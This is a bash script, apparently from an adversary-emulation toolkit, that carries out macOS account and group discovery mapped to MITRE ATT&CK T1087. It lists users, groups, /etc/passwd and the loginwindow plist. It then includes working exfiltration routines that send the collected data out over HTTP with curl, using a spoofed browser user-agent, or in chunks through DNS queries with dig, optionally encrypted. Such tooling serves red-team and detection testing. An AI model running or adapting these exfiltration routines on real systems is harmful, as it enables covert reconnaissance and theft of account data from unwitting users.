#!/bin/bash
# accounts.sh

# Script Name: accounts.sh
# MITRE ATT&CK Technique: T1087 - Account Discovery
# Tactic: Discovery
# Platform: macOS
# Sub-techniques: 
#   T1087.001 - Local Account
#   T1087.002 - Domain Account (if applicable)
#   T1087.003 - Email Account (if applicable)

# Author: @darmado x.com/darmad0
# Date: 2023-10-06
# Version: 1.5

# Description:
# This script identifies valid local accounts and groups on macOS systems using various techniques.
# It employs native macOS commands to gather user and group information.

# References:
# - https://attack.mitre.org/techniques/T1087/
# - https://attack.mitre.org/techniques/T1087/001/
# - https://attack.mitre.org/techniques/T1087/002/
# - https://attack.mitre.org/techniques/T1087/003/
# - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1087.001/T1087.001.yaml



# Display help message
display_help() {
    echo "Usage: $0 [OPTIONS]"
    echo
    echo "Description:"
    echo "  Identifies valid local accounts and groups on macOS systems using various native commands."
    echo
    echo "Options:"
    echo "  General:"
    echo "    -h, --help              Display this help message"
    echo "    -v, --verbose           Enable verbose output"
    echo "    -a, --all               Run all techniques"
    echo
    echo "  User Discovery:"
    echo "    -d, --user-dirs         List user directories using 'ls -la /Users'"
    echo "    -l, --dscl-users        List users using 'dscl . -list /Users'"
    echo "    -p, --passwd            Display content of '/etc/passwd'"
    echo "    -i, --id                Show current user info using 'id' command"
    echo "    -w, --who               List logged-in users with 'who' command"
    echo "    -s, --plist             Read user list from loginwindow plist"
    echo "    -m, --dscacheutil       List local users using 'dscacheutil -q user'"
    echo
    echo "  Group Discovery:"
    echo "    -g, --all-groups        Run all group discovery techniques"
    echo "    -gc, --cache-groups     List groups using 'dscacheutil -q group'"
    echo "    -gd, --dscl-groups      List groups using 'dscl . -list /Groups'"
    echo "    -ge, --etc-groups       List groups using 'grep /etc/group'"
    echo "    -gi, --id-groups        List groups using 'id -G'"
    echo "    -gg, --groups-cmd       List groups using 'groups' command"
    echo
    echo "  Output Manipulation:"
    echo "    --encode=TYPE           Encode output (b64|hex|uuencode|perl_b64|perl_utf8)"
    echo "    --exfil=URI             Exfiltrate output to URI using HTTP GET"
    echo "    --exfil=dns=DOMAIN      Exfiltrate output via DNS queries to DOMAIN (Base64 encoded)"
    echo "    --encrypt=METHOD        Encrypt output (aes|blowfish|gpg). Generates a random key."
    echo "    --log                 Enable logging of output to a file"
    echo
    echo "Examples:"
    echo "  $0 -a                     Run all discovery techniques"
    echo "  $0 -d -l -p               List user directories, DSCL users, and passwd content"
    echo "  $0 -g                     Run all group discovery techniques"
    echo "  $0 -m --encode=b64        List local users and encode output in base64"
    echo "  $0 -a --exfil=http://example.com --encrypt=aes  Run all techniques, encrypt, and exfiltrate"
    echo
    echo "Note: Some options may require elevated privileges to execute successfully."
}

generate_random_key() {
    openssl rand -base64 32 | tr -d '\n/'
}

encrypt_data() {
    local data="$1"
    local method="$2"
    local key="$3"

    case "$method" in
        aes)
            echo "$data" | openssl enc -aes-256-cbc -pbkdf2 -a -A -salt -pass pass:"$key"
            ;;
        blowfish)
            echo "$data" | openssl bf-cbc -pbkdf2 -a -A -salt -pass pass:"$key"
            ;;
        gpg)
            echo "$data" | gpg --batch --yes --passphrase "$key" --symmetric --armor
            ;;
        *)
            echo "Unsupported encryption method: $method" >&2
            return 1
            ;;
    esac
}

VERBOSE=false
ALL=false
USER_DIRS=false
DSCL_LIST=false
PASSWD_EXTRACT=false
ID_INFO=false
WHO_LIST=false
PLIST_READ=false
GROUP_ALL=false
GROUP_DSCACHEUTIL=false
GROUP_DSCL=false
GROUP_ETC=false
GROUP_ID=false
GROUP_CMD=false
DSCACHEUTIL_USERS=false
ENCODE="none"
EXFIL=false
EXFIL_METHOD=""
EXFIL_URI=""
ENCRYPT="none"
ENCRYPT_KEY=""
LOG_ENABLED=false
LOG_FILE=""

# Parse command-line arguments
while [ "$#" -gt 0 ]; do
    case "$1" in
        -h|--help) 
            display_help
            exit 0 
            ;;
        -v|--verbose)
            VERBOSE=true
            ;;
        -v) VERBOSE=true ;;
        -a) ALL=true ;;
        -d) USER_DIRS=true ;;
        -l) DSCL_LIST=true ;;
        -p) PASSWD_EXTRACT=true ;;
        -i) ID_INFO=true ;;
        -w) WHO_LIST=true ;;
        -s) PLIST_READ=true ;;
        -g) GROUP_ALL=true ;;
        -gc) GROUP_DSCACHEUTIL=true ;;
        -gd) GROUP_DSCL=true ;;
        -ge) GROUP_ETC=true ;;
        -gi) GROUP_ID=true ;;
        -gg) GROUP_CMD=true ;;
        -m) DSCACHEUTIL_USERS=true ;;
        --encode=*) ENCODE="${1#*=}" ;;
        --exfil=*)
            EXFIL=true
            EXFIL_METHOD="${1#*=}"
            if [[ "$EXFIL_METHOD" == dns=* ]]; then
                EXFIL_METHOD="dns"
                EXFIL_URI="${1#*=dns=}"
            else
                EXFIL_METHOD="http"
                EXFIL_URI="${1#*=}"
            fi
            ;;
        --encrypt=*)
            ENCRYPT="${1#*=}"
            ENCRYPT_KEY=$(generate_random_key)
            if [ "$VERBOSE" = true ]; then
                echo "Generated encryption key: $ENCRYPT_KEY"
            fi
            ;;
        --log)
            LOG_ENABLED=true
            ;;
        *) echo "Invalid option: $1" >&2; display_help; exit 1 ;;
    esac
    shift
done

# Encoding function
encode_output() {
    local output=$1
    case $ENCODE in
        b64)
            echo "$output" | base64
            ;;
        hex)
            echo "$output" | xxd -p
            ;;
        uuencode)
            echo "$output" | uuencode -m -
            ;;
        perl_b64)
            echo "$output" | perl -e 'use MIME::Base64; print encode_base64(join("", <STDIN>));'
            ;;
        perl_utf8)
            echo "$output" | perl -e 'use Encode qw(encode); print encode("utf8", join("", <STDIN>));'
            ;;
        *)
            echo "$output"
            ;;
    esac
}

# Exfiltration functions
exfiltrate_http() {
    local data="$1"
    local uri="$2"
    if [ -z "$data" ]; then
        echo "No data to exfiltrate" >&2
        return 1
    fi
    if [ "$ENCRYPT" != "none" ]; then
        data=$(encrypt_data "$data" "$ENCRYPT" "$ENCRYPT_KEY")
        encoded_key=$(echo "$ENCRYPT_KEY" | base64 | tr '+/' '-_' | tr -d '=')
    fi
    encoded_data=$(echo "$data" | base64 | tr '+/' '-_' | tr -d '=')
    
    # Determine if we're using HTTPS
    if [[ "$uri" == https://* ]]; then
        curl_opts="--insecure"
    else
        curl_opts=""
    fi
    
    local full_uri="$uri?d=$encoded_data"
    if [ "$ENCRYPT" != "none" ]; then
        full_uri="${full_uri}&_k=$encoded_key"
    fi
    
    if [ "$VERBOSE" = true ]; then
        echo "Exfiltrating data to $uri"
        curl -v $curl_opts -A "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15" "$full_uri"
    else
        curl -s $curl_opts -A "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15" "$full_uri" > /dev/null 2>&1
    fi
}

exfiltrate_dns() {
    local data=$1
    local domain=$2
    local id=$3
    local encoded_data=$(echo "$data" | base64 | tr '+/' '-_' | tr -d '=')
    local encoded_id=$(echo "$id" | base64 | tr '+/' '-_' | tr -d '=')
    local chunk_size=63  # Max length of a DNS label

    # Send the ID first
    dig +short "${encoded_id}.id.$domain" A > /dev/null

    # Then send the data in chunks
    local i=0
    while [ -n "$encoded_data" ]; do
        chunk="${encoded_data:0:$chunk_size}"
        encoded_data="${encoded_data:$chunk_size}"
        dig +short "${chunk}.${i}.$domain" A > /dev/null
        i=$((i+1))
    done
    # Send a final chunk to indicate end of transmission
    dig +short "end.$domain" A > /dev/null
}

# Account discovery functions
list_user_dirs() {
    echo "User directories in /Users using ls -la command:"
    ls -la /Users
}

list_dscl_users() {
    echo "Users listed by dscl . -list /Users command:"
    dscl . -list /Users
}

extract_passwd_users() {
    echo "Content of /etc/passwd file:"
    cat /etc/passwd
}

show_id_info() {
    echo "Current user info from id command:"
    id
}

list_logged_users() {
    echo "Currently logged in users from who command:"
    who
}

read_loginwindow_plist() {
    echo "Content of loginwindow plist using defaults read command:"
    defaults read /Library/Preferences/com.apple.loginwindow.plist
}

list_groups_dscacheutil() {
    echo "Groups listed by dscacheutil -q group command:"
    dscacheutil -q group
}

list_groups_dscl() {
    echo "Groups listed by dscl . -list /Groups command:"
    dscl . -list /Groups
}

list_groups_etc() {
    echo "Groups listed from /etc/group file:"
    grep -v '^#' /etc/group
}

list_groups_id() {
    echo "Groups for current user using id -G command:"
    id -G
}

list_groups_cmd() {
    echo "Groups for current user using groups command:"
    groups
}

list_dscacheutil_users() {
    echo "Local users listed by dscacheutil -q user command:"
    dscacheutil -q user
}

setup_logging() {
    local script_name=$(basename "$0" .sh)
    local hash=$(echo $RANDOM | md5sum | head -c 8)
    LOG_FILE="./${script_name}.${hash}.log"
    touch "$LOG_FILE"
}

log_output() {
    local output="$1"
    local max_size=$((5 * 1024 * 1024))  # 5MB in bytes
    
    if [ ! -f "$LOG_FILE" ] || [ $(stat -f%z "$LOG_FILE") -ge $max_size ]; then
        setup_logging
    fi
    
    echo "$output" >> "$LOG_FILE"
    
    # Rotate log if it exceeds 5MB
    if [ $(stat -f%z "$LOG_FILE") -ge $max_size ]; then
        mv "$LOG_FILE" "${LOG_FILE}.old"
        setup_logging
    fi
}

# Main function
main() {
    local output=""
    
    if [ "$LOG_ENABLED" = true ]; then
        setup_logging
    fi
    
    if [ "$ALL" = true ] || [ "$USER_DIRS" = true ]; then
        output+="$(list_user_dirs)\n\n"
    fi

    if [ "$ALL" = true ] || [ "$DSCL_LIST" = true ]; then
        output+="$(list_dscl_users)\n\n"
    fi

    if [ "$ALL" = true ] || [ "$PASSWD_EXTRACT" = true ]; then
        output+="$(extract_passwd_users)\n\n"
    fi

    if [ "$ALL" = true ] || [ "$ID_INFO" = true ]; then
        output+="$(show_id_info)\n\n"
    fi

    if [ "$ALL" = true ] || [ "$WHO_LIST" = true ]; then
        output+="$(list_logged_users)\n\n"
    fi

    if [ "$ALL" = true ] || [ "$PLIST_READ" = true ]; then
        output+="$(read_loginwindow_plist)\n\n"
    fi

    if [ "$ALL" = true ] || [ "$GROUP_ALL" = true ] || [ "$GROUP_DSCACHEUTIL" = true ]; then
        output+="$(list_groups_dscacheutil)\n\n"
    fi

    if [ "$ALL" = true ] || [ "$GROUP_ALL" = true ] || [ "$GROUP_DSCL" = true ]; then
        output+="$(list_groups_dscl)\n\n"
    fi

    if [ "$ALL" = true ] || [ "$GROUP_ALL" = true ] || [ "$GROUP_ETC" = true ]; then
        output+="$(list_groups_etc)\n\n"
    fi

    if [ "$ALL" = true ] || [ "$GROUP_ALL" = true ] || [ "$GROUP_ID" = true ]; then
        output+="$(list_groups_id)\n\n"
    fi

    if [ "$ALL" = true ] || [ "$GROUP_ALL" = true ] || [ "$GROUP_CMD" = true ]; then
        output+="$(list_groups_cmd)\n\n"
    fi

    if [ "$ALL" = true ] || [ "$DSCACHEUTIL_USERS" = true ]; then
        output+="$(list_dscacheutil_users)\n\n"
    fi

    # Encode output if specified
    if [ "$ENCODE" != "none" ]; then
        output=$(encode_output "$output")
    fi

    # Log output if enabled
    if [ "$LOG_ENABLED" = true ]; then
        log_output "$output"
    fi

    # Exfiltrate data if specified
    if [ "$EXFIL" = true ]; then
        if [ "$EXFIL_METHOD" = "dns" ]; then
            if [ "$ENCRYPT" != "none" ]; then
                encrypted_data=$(encrypt_data "$output" "$ENCRYPT" "$ENCRYPT_KEY")
                exfiltrate_dns "$encrypted_data" "$EXFIL_URI" "$ENCRYPT_KEY"
            else
                exfiltrate_dns "$output" "$EXFIL_URI"
            fi
        else
            exfiltrate_http "$output" "$EXFIL_URI"
        fi
    elif [ "$LOG_ENABLED" = false ]; then
        # Only print to screen if logging is not enabled
        echo -e "$output"
    fi
}

main